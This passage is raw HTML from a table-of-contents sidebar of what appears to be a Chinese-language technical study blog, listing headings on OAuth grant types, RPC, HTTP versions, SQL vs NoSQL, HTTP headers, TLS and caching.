class="toc-text">🌟 2. 简化模式（Implicit Grant）🚫（已废弃&#x2F;不推荐）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%8C%90-%E6%B5%81%E7%A8%8B%EF%BC%9A-2"><span class="toc-text">🌐 流程：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9D%8C-%E7%BC%BA%E7%82%B9%EF%BC%9A-2"><span class="toc-text">❌ 缺点：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%8C%9F-3-%E5%AF%86%E7%A0%81%E6%A8%A1%E5%BC%8F%EF%BC%88Resource-Owner-Password-Credentials-Grant%EF%BC%89"><span class="toc-text">🌟 3. 密码模式（Resource Owner Password Credentials Grant）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%8C%90-%E6%B5%81%E7%A8%8B%EF%BC%9A-3"><span class="toc-text">🌐 流程：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9D%8C-%E7%BC%BA%E7%82%B9%EF%BC%9A-3"><span class="toc-text">❌ 缺点：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">stub、skeleton（RPC）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%8E%AF-%E4%B8%BE%E4%B8%AA%E4%BE%8B%E5%AD%90%EF%BC%9A%E4%BD%A0%E6%89%93%E7%94%B5%E8%AF%9D%E5%8F%AB%E5%A4%96%E5%8D%96"><span class="toc-text">🎯 举个例子：你打电话叫外卖</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E4%BD%A0%E8%BF%99%E8%BE%B9%E6%98%AF%E5%AE%A2%E6%88%B7%E7%AB%AF%EF%BC%9A"><span class="toc-text">✅ 你这边是客户端：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%8E%A5%E5%88%B0%E8%AF%B7%E6%B1%82%EF%BC%9A"><span class="toc-text">✅ 服务端接到请求：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">从SOA到微服务</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">HTTP&#x2F;1.0、1.1、2.0、3.0和HTTP Server 1.0、2.0、3.0的区别</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%98-%E4%B8%80%E3%80%81HTTP-1-0-%E2%80%94%E2%80%94-%E5%8E%9F%E5%A7%8B%E5%8D%8F%E8%AE%AE"><span class="toc-text">📘 一、HTTP&#x2F;1.0 —— 原始协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E6%A0%B8%E5%BF%83%E7%89%B9%E7%82%B9%EF%BC%9A"><span class="toc-text">✅ 核心特点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9D%8C-%E5%AD%98%E5%9C%A8%E9%97%AE%E9%A2%98%EF%BC%9A"><span class="toc-text">❌ 存在问题：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8C-%E4%B8%BE%E4%BE%8B%EF%BC%9A"><span class="toc-text">📌 举例：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%97-%E4%BA%8C%E3%80%81HTTP-1-1-%E2%80%94%E2%80%94-%E4%B8%BB%E6%B5%81%E5%8D%8F%E8%AE%AE"><span class="toc-text">📗 二、HTTP&#x2F;1.1 —— 主流协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E6%A0%B8%E5%BF%83%E6%94%B9%E8%BF%9B%EF%BC%9A"><span class="toc-text">✅ 核心改进：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9D%8C-%E9%97%AE%E9%A2%98%E4%BB%8D%E5%9C%A8%EF%BC%9A"><span class="toc-text">❌ 问题仍在：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8C-%E4%B8%BE%E4%BE%8B%EF%BC%9A-2"><span class="toc-text">📌 举例：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%95-%E4%B8%89%E3%80%81HTTP-2-0-%E2%80%94%E2%80%94-%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%E6%97%B6%E4%BB%A3"><span class="toc-text">📕 三、HTTP&#x2F;2.0 —— 多路复用时代</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E6%A0%B8%E5%BF%83%E6%94%B9%E8%BF%9B%EF%BC%9A-2"><span class="toc-text">✅ 核心改进：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%8E%AF-%E4%BC%98%E7%82%B9%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-text">🎯 优点总结：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8C-%E4%B8%BE%E4%BE%8B%EF%BC%9A-3"><span class="toc-text">📌 举例：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%99-%E5%9B%9B%E3%80%81HTTP-3-0-%E2%80%94%E2%80%94-%E5%9F%BA%E4%BA%8E-QUIC-%E5%8D%8F%E8%AE%AE"><span class="toc-text">📙 四、HTTP&#x2F;3.0 —— 基于 QUIC 协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E6%A0%B8%E5%BF%83%E5%88%9B%E6%96%B0%EF%BC%9A"><span class="toc-text">✅ 核心创新：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%8E%AF-%E4%BC%98%E7%82%B9%E6%80%BB%E7%BB%93%EF%BC%9A-2"><span class="toc-text">🎯 优点总结：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8C-%E4%B8%BE%E4%BE%8B%EF%BC%9A-4"><span class="toc-text">📌 举例：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%8A-%E6%80%BB%E7%BB%93%E5%AF%B9%E6%AF%94%E8%A1%A8%E6%A0%BC%EF%BC%9A"><span class="toc-text">📊 总结对比表格：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E9%9D%A2%E8%AF%95-%E7%AD%94%E9%A2%98%E6%80%BB%E7%BB%93%E6%A8%A1%E6%9D%BF%EF%BC%9A"><span class="toc-text">✅ 面试&#x2F;答题总结模板：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%8D%BD%EF%B8%8F-%E5%9C%BA%E6%99%AF%E8%AE%BE%E5%AE%9A%EF%BC%9A%E4%BD%A0%E5%8E%BB%E9%A4%90%E5%8E%85%E7%82%B9%E8%8F%9C"><span class="toc-text">🍽️ 场景设定：你去餐厅点菜</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-HTTP-1-0%EF%BC%9A%E4%B8%80%E4%B8%AA%E8%8F%9C%E4%B8%80%E8%B6%9F%EF%BC%8C%E7%82%B9%E4%B8%80%E6%AC%A1%E8%B5%B0%E4%B8%80%E6%AC%A1"><span class="toc-text">✅ HTTP&#x2F;1.0：一个菜一趟，点一次走一次</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-HTTP-1-1%EF%BC%9A%E7%82%B9%E5%A4%9A%E4%B8%AA%E8%8F%9C%EF%BC%8C%E4%B8%80%E6%AC%A1%E9%80%81%E5%AE%8C%EF%BC%88%E6%94%AF%E6%8C%81%E9%95%BF%E8%BF%9E%E6%8E%A5%EF%BC%89"><span class="toc-text">✅ HTTP&#x2F;1.1：点多个菜，一次送完（支持长连接）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-HTTP-2%EF%BC%9A%E6%9C%8D%E5%8A%A1%E5%91%98%E4%BC%9A%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%8A%E8%8F%9C%EF%BC%88%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%EF%BC%89"><span class="toc-text">✅ HTTP&#x2F;2：服务员会多线程上菜（多路复用）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-HTTP-3%EF%BC%9A%E7%82%B9%E9%A4%90%E3%80%81%E4%BC%A0%E8%8F%9C%E9%83%BD%E7%94%A8%E5%A4%96%E5%8D%96%E5%91%98%EF%BC%88UDP-QUIC%EF%BC%89-%E8%BF%98%E6%94%AF%E6%8C%81%E6%96%AD%E7%82%B9%E7%BB%AD%E4%BC%A0"><span class="toc-text">✅ HTTP&#x2F;3：点餐、传菜都用外卖员（UDP + QUIC）+ 还支持断点续传</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%92%AC-%E9%9D%A2%E8%AF%95%E7%AD%94%E9%A2%98%E6%A8%A1%E6%9D%BF%EF%BC%88%E5%8F%AF%E8%83%8C%E8%AF%B5%EF%BC%89%EF%BC%9A"><span class="toc-text">💬 面试答题模板（可背诵）：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%92%AC-%E9%9D%A2%E8%AF%95%E7%AD%94%E9%A2%98%E6%A8%A1%E6%9D%BF"><span class="toc-text">💬 面试答题模板</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E5%9C%A8-HTTP-1-1-%E4%B8%AD%E5%AE%9E%E9%99%85%E7%9A%84%E5%90%AB%E4%B9%89%E6%98%AF%EF%BC%9A"><span class="toc-text">✅ 在 HTTP&#x2F;1.1 中实际的含义是：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%81-%E4%B9%9F%E5%B0%B1%E6%98%AF%E8%AF%B4%EF%BC%9A"><span class="toc-text">🔁 也就是说：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%BE%E4%BE%8B%EF%BC%88%E6%9B%B4%E6%8A%80%E6%9C%AF%E7%82%B9%EF%BC%89%EF%BC%9A"><span class="toc-text">✅ 举例（更技术点）：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E6%89%80%E4%BB%A5%E4%BD%A0%E9%97%AE%E7%9A%84%E2%80%9C%E6%98%AF%E5%90%A6%E4%B8%80%E6%AC%A1%E6%80%A7%E6%8A%8A%E6%89%80%E6%9C%89%E8%A6%81%E7%9A%84%E6%95%B0%E6%8D%AE%E9%83%BD%E5%8F%96%E5%87%BA%E2%80%9D%EF%BC%9A"><span class="toc-text">✅ 所以你问的“是否一次性把所有要的数据都取出”：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A0-%E4%B8%BE%E4%B8%AA%E7%8E%B0%E5%AE%9E%E7%9A%84%E4%BE%8B%E5%AD%90%E5%B8%AE%E5%8A%A9%E4%BD%A0%E7%90%86%E8%A7%A3"><span class="toc-text">🧠 举个现实的例子帮助你理解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%80%E4%BB%A5%EF%BC%9A"><span class="toc-text">所以：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP-2-0-%E8%99%BD%E7%84%B6%E8%A7%A3%E5%86%B3%E4%BA%86%E2%80%9C%E5%BA%94%E7%94%A8%E5%B1%82%E9%98%9F%E5%A4%B4%E9%98%BB%E5%A1%9E%E2%80%9D%EF%BC%8C%E4%BD%86%E4%BB%8D%E7%84%B6%E5%AD%98%E5%9C%A8%E2%80%9CTCP-%E5%B1%82%E9%98%9F%E5%A4%B4%E9%98%BB%E5%A1%9E%E2%80%9D%E9%97%AE%E9%A2%98"><span class="toc-text">HTTP&#x2F;2.0 虽然解决了“应用层队头阻塞”，但仍然存在“TCP 层队头阻塞”问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#http-2-0%E5%92%8Chttp-3-0%E5%AE%89%E5%85%A8%E6%80%A7%E5%AF%B9%E6%AF%94"><span class="toc-text">http&#x2F;2.0和http&#x2F;3.0安全性对比</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%8D-%E8%AF%A6%E7%BB%86%E8%A7%A3%E9%87%8A"><span class="toc-text">🔍 详细解释</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%B9-HTTP-2-0-%E7%9A%84%E5%8A%A0%E5%AF%86%EF%BC%88%E5%9F%BA%E4%BA%8E-TLS%EF%BC%89"><span class="toc-text">🔹 HTTP&#x2F;2.0 的加密（基于 TLS）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%B9-HTTP-3-0-%E7%9A%84%E5%8A%A0%E5%AF%86%EF%BC%88%E5%9F%BA%E4%BA%8E-QUIC%EF%BC%89"><span class="toc-text">🔹 HTTP&#x2F;3.0 的加密（基于 QUIC）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A0-%E4%B8%BE%E4%B8%AA%E5%AE%9E%E9%99%85%E4%BE%8B%E5%AD%90%EF%BC%9A%E9%98%B2%E6%AD%A2%E6%94%BB%E5%87%BB"><span class="toc-text">🧠 举个实际例子：防止攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%83%85%E5%A2%83%EF%BC%9A"><span class="toc-text">情境：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%96%B6%EF%B8%8F-%E4%BD%BF%E7%94%A8-HTTP-2-0%EF%BC%88TCP-TLS%EF%BC%89"><span class="toc-text">▶️ 使用 HTTP&#x2F;2.0（TCP + TLS）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%96%B6%EF%B8%8F-%E4%BD%BF%E7%94%A8-HTTP-3-0%EF%BC%88QUIC-UDP%EF%BC%89"><span class="toc-text">▶️ 使用 HTTP&#x2F;3.0（QUIC + UDP）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">SQL和NoSQL有什么区别</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%B6-%E4%B8%80%E3%80%81Key-Value-%E5%9E%8B%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%88%E5%A6%82-Redis%EF%BC%89"><span class="toc-text">🔶 一、Key-Value 型数据库（如 Redis）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E5%BA%94%E7%94%A8%E7%A4%BA%E4%BE%8B%EF%BC%9A%E7%94%B5%E5%95%86%E5%B9%B3%E5%8F%B0%E7%9A%84%E5%95%86%E5%93%81%E7%A7%92%E6%9D%80%E7%B3%BB%E7%BB%9F"><span class="toc-text">✅ 应用示例：电商平台的商品秒杀系统</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%B6-%E4%BA%8C%E3%80%81Document-%E5%9E%8B%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%88%E5%A6%82-MongoDB%EF%BC%89"><span class="toc-text">🔶 二、Document 型数据库（如 MongoDB）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E5%BA%94%E7%94%A8%E7%A4%BA%E4%BE%8B%EF%BC%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%EF%BC%88CMS%EF%BC%89-%E6%96%87%E7%AB%A0%E5%8F%91%E5%B8%83%E5%B9%B3%E5%8F%B0"><span class="toc-text">✅ 应用示例：内容管理系统（CMS）&#x2F; 文章发布平台</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%B6-%E4%B8%89%E3%80%81Column-Family-%E5%9E%8B%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%88%E5%A6%82-HBase%E3%80%81Cassandra%EF%BC%89"><span class="toc-text">🔶 三、Column-Family 型数据库（如 HBase、Cassandra）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E5%BA%94%E7%94%A8%E7%A4%BA%E4%BE%8B%EF%BC%9A%E7%94%A8%E6%88%B7%E8%A1%8C%E4%B8%BA%E6%97%A5%E5%BF%97%E5%AD%98%E5%82%A8%E7%B3%BB%E7%BB%9F"><span class="toc-text">✅ 应用示例：用户行为日志存储系统</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%B6-%E5%9B%9B%E3%80%81Graph-%E5%9E%8B%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%88%E5%A6%82-Neo4j%EF%BC%89"><span class="toc-text">🔶 四、Graph 型数据库（如 Neo4j）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E5%BA%94%E7%94%A8%E7%A4%BA%E4%BE%8B%EF%BC%9A%E7%A4%BE%E4%BA%A4%E7%BD%91%E7%BB%9C%E5%A5%BD%E5%8F%8B%E6%8E%A8%E8%8D%90"><span class="toc-text">✅ 应用示例：社交网络好友推荐</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%B6-%E5%9C%BA%E6%99%AF%EF%BC%9A%E7%94%A8%E6%88%B7%E8%A1%8C%E4%B8%BA%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%EF%BC%88%E5%A6%82%EF%BC%9A%E7%94%B5%E5%95%86%E7%BD%91%E7%AB%99%EF%BC%89"><span class="toc-text">🔶 场景：用户行为日志系统（如：电商网站）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%8D-%E6%9F%A5%E8%AF%A2%E6%93%8D%E4%BD%9C%E4%B8%BE%E4%BE%8B%EF%BC%9A"><span class="toc-text">🔍 查询操作举例：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E7%94%A8%E6%88%B7-u1234-%E7%9A%84%E6%89%80%E6%9C%89%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95%EF%BC%88%E6%97%B6%E9%97%B4%E5%80%92%E5%BA%8F%EF%BC%89%EF%BC%9A"><span class="toc-text">查询用户 u1234 的所有操作记录（时间倒序）：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%BC%98%E5%8A%BF%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-text">✅ 优势总结：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E7%94%A8%E6%88%B7%E8%A1%8C%E4%B8%BA%E7%94%9F%E6%88%90-%E2%80%94%E2%80%94-%E6%9D%A5%E8%87%AA%E5%89%8D%E7%AB%AF%E6%88%96-App-%E7%9A%84%E5%9F%8B%E7%82%B9"><span class="toc-text">✅ 第一步：用户行为生成 —— 来自前端或 App 的埋点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E6%B6%88%E6%81%AF%E4%BC%A0%E9%80%92-%E2%80%94%E2%80%94-%E9%80%9A%E5%B8%B8%E7%BB%8F%E7%94%B1%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%88%E5%A6%82-Kafka%EF%BC%89"><span class="toc-text">✅ 第二步：消息传递 —— 通常经由消息队列（如 Kafka）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E6%B6%88%E8%B4%B9%E8%80%85%E6%B6%88%E8%B4%B9%E6%B6%88%E6%81%AF%E5%B9%B6%E5%86%99%E5%85%A5-HBase"><span class="toc-text">✅ 第三步：消费者消费消息并写入 HBase</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-%E5%86%99%E5%85%A5%E9%80%BB%E8%BE%91%E7%A4%BA%E6%84%8F%EF%BC%9A"><span class="toc-text">Java 写入逻辑示意：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">sql执行顺序</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8C-%E4%B8%BE%E4%B8%AA%E4%BE%8B%E5%AD%90%EF%BC%9A"><span class="toc-text">📌 举个例子：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%99%85%E6%89%A7%E8%A1%8C%E9%A1%BA%E5%BA%8F%E5%A6%82%E4%B8%8B%EF%BC%9A"><span class="toc-text">实际执行顺序如下：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%BA%E5%B0%8F%E8%B4%B4%E5%A3%AB%EF%BC%9A"><span class="toc-text">🔺小贴士：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E4%B8%BE%E4%BE%8B%E8%AF%B4%E6%98%8E%EF%BC%9A"><span class="toc-text">✅ 举例说明：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%9A%AB-%E9%94%99%E8%AF%AF%E7%94%A8%E6%B3%95%EF%BC%88WHERE-%E4%B8%8D%E8%83%BD%E7%94%A8%E8%81%9A%E5%90%88%E5%87%BD%E6%95%B0%EF%BC%89%EF%BC%9A"><span class="toc-text">🚫 错误用法（WHERE 不能用聚合函数）：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-%E6%AD%A3%E7%A1%AE%E7%94%A8%E6%B3%95%EF%BC%88%E7%94%A8-HAVING-%E8%BF%87%E6%BB%A4%E5%88%86%E7%BB%84%E5%90%8E%E7%9A%84%E7%BB%93%E6%9E%9C%EF%BC%89%EF%BC%9A"><span class="toc-text">✅ 正确用法（用 HAVING 过滤分组后的结果）：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8C-SQL-%E6%89%A7%E8%A1%8C%E7%9A%84%E9%80%BB%E8%BE%91%E9%A1%BA%E5%BA%8F%EF%BC%88%E7%AE%80%E5%8C%96%E7%89%88%EF%BC%89%EF%BC%9A"><span class="toc-text">📌 SQL 执行的逻辑顺序（简化版）：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">返回顾客名称和相关订单号以及每个订单的总价</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E5%85%B3%E9%94%AE%E7%BB%93%E8%AE%BA%EF%BC%88%E8%A6%81%E8%AE%B0%E4%BD%8F%EF%BC%89%EF%BC%9A"><span class="toc-text">✅ 关键结论（要记住）：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A0-%E4%B8%BA%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-text">🧠 为什么？</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">javaguide-计网</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP-Header%E7%9A%84%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98"><span class="toc-text">HTTP Header的常见面试问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%8E%AF-%E9%9D%A2%E8%AF%95%E9%AB%98%E9%A2%91%E9%97%AE%E9%A2%98%EF%BC%9A"><span class="toc-text">🎯 面试高频问题：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-1-Cookie-%E5%92%8C-Authorization-%E7%9A%84%E5%8C%BA%E5%88%AB%E2%80%94%E2%80%94%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81%E5%9C%BA%E6%99%AF%E4%B8%BE%E4%BE%8B"><span class="toc-text">✅ 1. Cookie 和 Authorization 的区别——登录认证场景举例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-2-%E5%89%8D%E7%AB%AF%E7%BC%93%E5%AD%98%E6%8E%A7%E5%88%B6%E2%80%94%E2%80%94%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E8%AE%BF%E9%97%AE%E5%9C%BA%E6%99%AF"><span class="toc-text">✅ 2. 前端缓存控制——静态资源访问场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-3-CORS-%E5%AE%9E%E7%8E%B0%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82%E2%80%94%E2%80%94%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E9%A1%B9%E7%9B%AE%E6%8E%A5%E5%8F%A3%E8%B0%83%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-text">✅ 3. CORS 实现跨域请求——前后端分离项目接口调用场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-4-ETag-%E5%92%8C-Last-Modified-%E5%8D%8F%E5%95%86%E7%BC%93%E5%AD%98%E2%80%94%E2%80%94%E5%86%85%E5%AE%B9%E6%9B%B4%E6%96%B0%E6%A3%80%E6%B5%8B%E5%9C%BA%E6%99%AF"><span class="toc-text">✅ 4. ETag 和 Last-Modified 协商缓存——内容更新检测场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-5-User-Agent-%E4%B8%8E-Referer-%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E5%88%86%E6%9E%90%E2%80%94%E2%80%94%E5%8F%8D%E7%88%AC%E8%99%AB%E4%B8%8E-CSRF-%E9%98%B2%E5%BE%A1%E5%9C%BA%E6%99%AF"><span class="toc-text">✅ 5. User-Agent 与 Referer 的安全性分析——反爬虫与 CSRF 防御场景</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-User-Agent-%E9%98%B2%E7%88%AC%E8%99%AB"><span class="toc-text">✅ User-Agent 防爬虫</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9A%A0%EF%B8%8F-Referer-%E6%B3%84%E9%9C%B2%E4%B8%8E%E9%A3%8E%E9%99%A9"><span class="toc-text">⚠️ Referer 泄露与风险</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TLS%E4%BC%A0%E8%BE%93%E5%B1%82%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE"><span class="toc-text">TLS传输层安全协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP-1-0-%E3%80%81HTTP-1-1%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6"><span class="toc-text">HTTP&#x2F;1.0 、HTTP&#x2F;1.1缓存机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-HTTP-1-0-%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3"><span class="toc-text">✅ HTTP&#x2F;1.0 缓存机制详解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%8E%AF-%E6%A0%B8%E5%BF%83%E5%AD%97%E6%AE%B5"><span class="toc-text">🎯 核心字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%A0-%E7%BC%93%E5%AD%98%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%AD%96%E7%95%A5"><span class="toc-text">🧠 缓存的两种策略</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-1-%E5%BC%BA%E7%BC%93%E5%AD%98%EF%BC%88%E5%BC%BA%E5%88%B6%E4%BD%BF%E7%94%A8%E6%9C%AC%E5%9C%B0%E7%BC%93%E5%AD%98%EF%BC%8C%E4%B8%8D%E8%AF%B7%E6%B1%82%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89"><span class="toc-text">✅ 1. 强缓存（强制使用本地缓存，不请求服务器）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-2-%E5%8D%8F%E5%95%86%E7%BC%93%E5%AD%98%EF%BC%88%E5%85%88%E9%97%AE%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9C%89%E6%B2%A1%E6%9C%89%E6%9B%B4%E6%96%B0%EF%BC%89"><span class="toc-text">✅ 2. 协商缓存（先问服务器有没有更新）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%BE%E4%B8%AA%E4%BE%8B%E5%AD%90"><span class="toc-text">✅ 举个例子</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%81-%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%AF%B7%E6%B1%82%EF%BC%88%E6%B2%A1%E6%9C%89%E7%BC%93%E5%AD%98%EF%BC%89"><span class="toc-text">🔁 第一次请求（没有缓存）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 